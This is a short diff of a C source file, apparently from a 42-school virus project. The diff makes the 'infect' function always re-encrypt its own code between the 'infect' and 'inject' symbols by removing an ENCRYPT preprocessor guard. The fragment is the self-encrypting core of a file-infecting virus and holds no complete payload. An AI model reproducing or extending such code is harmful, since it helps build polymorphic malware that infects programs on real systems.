@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:22:03 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/31 19:21:04 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/31 20:56:53 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,10 +14,8 @@
 
 void		infect(t_data *data)
 {
-#ifdef ENCRYPT
 //	revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
 	update_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
-#endif
 
 #ifdef DEBUG
 	char de[] = "infect\t \n";
